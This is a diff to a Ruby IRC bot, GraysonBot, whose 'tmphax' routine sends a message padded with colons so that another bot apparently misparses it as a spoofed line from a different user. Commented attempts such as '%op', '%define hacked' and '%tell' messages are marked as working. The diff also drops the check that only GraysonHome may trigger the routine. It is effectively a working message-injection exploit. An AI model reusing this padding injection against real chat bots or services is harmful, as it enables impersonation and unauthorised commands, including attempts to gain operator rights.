@@ -39,10 +39,8 @@ class GraysonBot
         return
       end
 
-      if msg.prefix.start_with?('GraysonHome!')
-        if md = msg.params[1].match(/tmphax(.*)/)
-          tmphax(md[1])
-        end
+      if md = msg.params[1].match(/%cve2(.*)/)
+        tmphax(md[1])
       end
 
       if msg.params[1].include?("cleverbot")
@@ -87,11 +85,11 @@ class GraysonBot
     # Send the payload.
     padding_size = 1024 - 920 - header_size + padding_fudge
 
-    command = ':bgm!bgm@bcc4f687 PRIVMSG #pub :%op GraysonHome'  # doesn't quite work
+    # command = ':bgm!bgm@bcc4f687 PRIVMSG #pub :%op DavidEGrayson'  # doesn't quite work
     # command = ':GraysonHome!GraysonHome@bcc4f687 PRIVMSG Gr3yBot :%help'  # worked
     # command = ':GraysonHome!GraysonHome@bcc4f687 PRIVMSG #pub :%define test'  # worked
     # command = ':McNutnut!McNutnut@bcc4f687 PRIVMSG Gr3yBot :%define hacked'
-    # command = ':MasterChen!MasterChen@bcc4f687 PRIVMSG #pub :%tell DavidEGrayson you are a totally cool dude and totally not hacking me to say this right now'  # worked
+    command = ':McNutnut!McNutnut@bcc4f687 PRIVMSG #pub :%tell bgm much hax, so wow, omg wtf bbq bgm abc'  # worked
 
     send 'PRIVMSG', target, (':' * (padding_size)) + command
   end
